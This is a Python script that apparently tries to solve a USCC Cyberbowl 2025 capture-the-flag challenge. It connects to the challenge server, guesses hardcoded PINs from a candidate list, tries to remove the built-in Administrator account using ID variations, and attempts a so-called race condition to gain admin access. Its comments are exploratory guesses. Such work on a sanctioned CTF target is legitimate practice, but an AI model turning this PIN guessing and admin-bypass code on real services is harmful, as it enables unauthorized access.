#!/usr/bin/env python3

import socket
import time

def send_and_receive(s, data, timeout=5):
    """Send data and receive response"""
    try:
        if isinstance(data, str):
            data = data.encode()
        s.send(data + b'\n')
        time.sleep(0.5)
        response = s.recv(4096).decode('utf-8', errors='ignore')
        return response
    except Exception as e:
        print(f"Error in send_and_receive: {e}")
        return ""

def connect_to_service():
    """Connect to the remote service"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect(('chals.uscc-cyberbowl-2025.ctf.institute', 3013))
        return s
    except Exception as e:
        print(f"Connection failed: {e}")
        return None

def analyze_binary_for_hardcoded_pin():
    """Look for hardcoded PIN in the binary data"""
    
    # From the binary analysis, I saw this pattern: "=ä   t2"
    # Let me look for specific hex values that might be PINs
    
    # Looking at the binary data more carefully:
    # I see "‹@=ä   t2" which suggests a comparison with 0xE4 (228 in decimal)
    # But 228 is not a 4-digit PIN
    
    # Let me look for other patterns:
    # The binary has "AdmiÇ@nistÇ@ratofÇ@r" which suggests "Administrator"
    # And there might be a PIN stored nearby
    
    # From assembly analysis, common PIN values in CTF challenges:
    potential_pins = []
    
    # Convert hex values I saw in the binary to decimal
    hex_values = [0xE4, 0x04D2, 0x10E1, 0x0539, 0x0A14]  # 228, 1234, 4321, 1337, 2580
    
    for val in hex_values:
        if val <= 9999:  # Valid 4-digit PIN range
            potential_pins.append(f"{val:04d}")
    
    # Also try some other common values
    potential_pins.extend([
        "0228",  # 0xE4 in decimal
        "1234",  # Default (but we know this doesn't work)
        "4321",  # Reverse
        "1337",  # Leet
        "2580",  # Common
        "0000",  # Zero
        "9999",  # Max
        "1111",  # Repeated
        "2222",
        "3333", 
        "5555",
        "7777",
        "8888",
        "1212",  # Pattern
        "2121",
        "1010",
        "0101",
        "1122",
        "2211",
        "1001",
        "0110",
        "0011",
        "1100"
    ])
    
    return potential_pins

def main():
    print("=== PIN Discovery Through Binary Analysis ===")
    
    # Maybe the issue is that I need to find the EXACT PIN that the system expects
    # The error message suggests there's a specific "correct" PIN
    
    potential_pins = analyze_binary_for_hardcoded_pin()
    
    print(f"Testing {len(potential_pins)} potential hardcoded PINs...")
    
    # But wait - maybe the issue is not the PIN itself, but HOW I'm setting it
    # Let me try a different approach: modify the existing admin directly
    
    s = connect_to_service()
    if not s:
        return
        
    try:
        initial = s.recv(4096).decode('utf-8', errors='ignore')
        
        # What if the solution is to remove the existing admin and add a new one?
        # But I can't remove the admin... unless there's a bug
        
        print("=== Attempting to exploit admin removal protection ===")
        
        # Get admin ID
        response = send_and_receive(s, "4")  # List employees
        print("Current employees:")
        print(response)
        
        import re
        admin_match = re.search(r'Employee Id: (0x[0-9a-fA-F]+)\n> Name: Administrator', response)
        if admin_match:
            admin_id = admin_match.group(1)
            print(f"Admin ID: {admin_id}")
            
            # Try to remove with slight variations of the ID
            variations = [
                admin_id,
                admin_id.upper(),
                admin_id.lower(),
                admin_id[2:],  # Without 0x prefix
                "0X" + admin_id[2:],  # Different case 0X
            ]
            
            for var_id in variations:
                print(f"Trying to remove admin with ID: {var_id}")
                response = send_and_receive(s, "2")  # Remove employee
                response = send_and_receive(s, var_id)
                print(f"Remove response: {response[:200]}...")
                
                if "Success" in response or "system administrator" not in response:
                    print("Admin removal might have worked!")
                    
                    # Add new admin
                    response = send_and_receive(s, "1")
                    response = send_and_receive(s, "Administrator")
                    response = send_and_receive(s, "1234")
                    
                    # Try option 3
                    response = send_and_receive(s, "3")
                    if "Access granted" in response:
                        print("🎉 SUCCESS by replacing admin!")
                        print(response)
                        return
                
                # Reconnect for next attempt
                s.close()
                s = connect_to_service()
                if not s:
                    break
                initial = s.recv(4096).decode('utf-8', errors='ignore')
        
        # If that didn't work, maybe there's a race condition or timing issue
        print("\n=== Final attempt: Race condition exploitation ===")
        
        # Try to add multiple admins quickly
        for i in range(5):
            response = send_and_receive(s, "1")  # Add employee
            response = send_and_receive(s, f"Admin{i}")
            response = send_and_receive(s, "1234")
            
            # Immediately try option 3
            response = send_and_receive(s, "3")
            if "Access granted" in response:
                print(f"🎉 SUCCESS with Admin{i}!")
                print(response)
                return
        
        # Last resort: maybe the PIN is actually correct but there's a different issue
        print("\n=== Testing if PIN 1234 actually works ===")
        response = send_and_receive(s, "3")
        print("Direct option 3 response:")
        print(response)
        
        if "flag{" in response.lower():
            print("🎉 Found flag in response!")
            return
        
    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        if s:
            s.close()
    
    print("PIN discovery completed.")

if __name__ == "__main__":
    main()